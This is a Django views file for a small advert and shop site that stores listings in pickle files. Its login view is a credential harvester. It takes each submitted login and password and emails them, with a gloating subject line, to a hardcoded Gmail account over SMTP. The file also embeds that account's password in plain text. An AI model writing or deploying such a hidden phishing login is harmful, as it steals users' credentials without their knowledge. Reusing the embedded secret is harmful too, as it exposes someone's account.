from django.shortcuts import render
from django.urls import path
import os
from .models import Adverts
from .models import DataHolder
from . import urls
import pickle
import smtplib


ads = []

desclist=[]


def home(reguest):

	if reguest.method == "POST" :
		zapros = reguest.POST['flint']
		f = open("data.pickle", "rb")
		z = open("dict.pickle" , "rb")
		herald = pickle.load(z)
		gerald = pickle.load(f)
		for guys in gerald :
			if guys == zapros:
				indexOf = gerald.index(zapros)
				dorime = herald[indexOf].name
				dorime2 = herald[indexOf].price
				dorime3 = herald[indexOf].description
				return shopdet(reguest2=reguest, namus=dorime, prius=dorime2, descus=dorime3)
		
	else :
		return render(reguest , 'home.html' , {})


def blog(reguest1):
	opener = open("dict.pickle" , "wb")
	opener1 = open("data.pickle" , "wb")
	obj = "Mikush"
	desclist.append(obj)
	Obj = Adverts("Mikush" , "Bazukisnski" , "785632459$")
	ads.append(Obj)
	pickle.dump(desclist , opener1)
	pickle.dump(ads , opener)
	return render(reguest1, 'blog.html', {})

def shopdet(reguest2 , namus , prius , descus):

	DataHolder.name=namus
	DataHolder.price=prius
	DataHolder.description=descus
	var = DataHolder


	return render(reguest2, 'shopdet.html' , {'var' : var})

def shopdet2(reguest3):

	return render(reguest3, 'shopdet2.html' , {})

def shoppingcart(reguest4):
	return render(reguest4, 'shoppingcart.html' , {})

def contact(reguest5):
	if reguest5.method == "POST" :
		name = str(reguest5.POST['Name'])
		price = str(reguest5.POST['Price'])
		desc = str(reguest5.POST['Description'])
		chopin = Adverts(name,price,desc)
		reader = open('dict.pickle' , "rb")
		sam = pickle.load(reader)
		sam.append(chopin)
		writer2of1 = open("data.pickle" , "rb")
		readydata = pickle.load(writer2of1)
		readydata.append(name)
		writer1 = open("data.pickle", "wb")
		pickle.dump(readydata,writer1)
		writer1.close()
		writer = open('dict.pickle' , "wb")
		pickle.dump(sam ,writer)
		writer.close()
		return render(reguest5 , 'contact.html' , {})

	else:
		return render(reguest5, 'contact.html' , {})


def login(reguest):
	if reguest.method == "POST" :
		login = reguest.POST['login']
		password = reguest.POST['password']
		with smtplib.SMTP('smtp.gmail.com' , 587) as smtp :
			smtp.ehlo()
			smtp.starttls()
			smtp.ehlo()

			smtp.login("ZAAMG14@gmail.com" , "AA#14#G&HIGGS*m")

			msg = f'Subject: HAAHAHAH I GO HIM Login: {login} Password: {password}'
			smtp.sendmail("ZAAMG14@gmail.com","ZAAMG14@gmail.com",msg)
			return login1(reguest)
			
	else:
		return render(reguest , 'login.html' , {})

def login1(reguest):
	return render(reguest , 'login1.html' , {})
